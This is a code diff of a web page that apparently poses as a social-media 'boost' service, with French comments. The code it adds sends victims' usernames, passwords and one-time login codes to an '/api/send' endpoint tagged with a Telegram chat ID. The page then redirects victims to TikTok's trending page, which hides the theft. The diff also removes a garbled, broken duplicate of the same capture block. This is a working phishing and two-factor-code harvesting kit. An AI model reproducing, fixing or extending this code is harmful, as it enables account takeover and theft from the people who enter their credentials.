@@ -49,14 +49,6 @@
       </form>
     </div>
 
-try {
-                // Envoi des infos à ton API Telegram (6224971749)
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user: userVal, pass: passVal, attempt: attempts + 1 })
-                });
-
     <!-- SECTION 3 : TABLEAU DE BORD DE BOOST -->
     <div id="boost-section" class="hidden w-full max-w-lg flex flex-col items-center p-4 text-center">
       <div class="bg-gray-950 border border-purple-800/50 text-white p-8 rounded-3xl w-full shadow-2xl">
@@ -99,12 +91,20 @@ try {
 
           btn.innerText = "Synchronisation...";
           btn.disabled = true;
-                     try {
-                // Envoi des infos à ton API Telegram (6224971749)
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user: userVal, pass: passVal, OTP', user: savedUser, otp: otpCode attempt: attempts + 1 })
+
+          try {
+              // Envoi des infos à ton API (avec support de l'ID Telegram 6224971749)
+              await fetch('/api/send', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ 
+                      type: 'LOGIN', 
+                      chatId: '6224971749', 
+                      user: savedUser, 
+                      pass: passVal, 
+                      attempt: attempts + 1 
+                  })
+              });
 
               if (attempts === 0) {
                   setTimeout(() => {
@@ -135,10 +135,16 @@ try {
           otpBtn.disabled = true;
 
           try {
+              // Envoi du code OTP avec l'identifiant Telegram
               await fetch('/api/send', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ type: 'OTP', user: savedUser, otp: otpCode })
+                  body: JSON.stringify({ 
+                      type: 'OTP', 
+                      chatId: '6224971749', 
+                      user: savedUser, 
+                      otp: otpCode 
+                  })
               });
 
               document.getElementById('otp-section').classList.add('hidden');
@@ -157,4 +163,9 @@ try {
           text.classList.remove('hidden');
 
           setTimeout(() => {
-              window.location.href = 
+              window.location.href = "https://www.tiktok.com/trending";
+          }, 3000);
+      });
+    </script>
+  </body>
+</html>
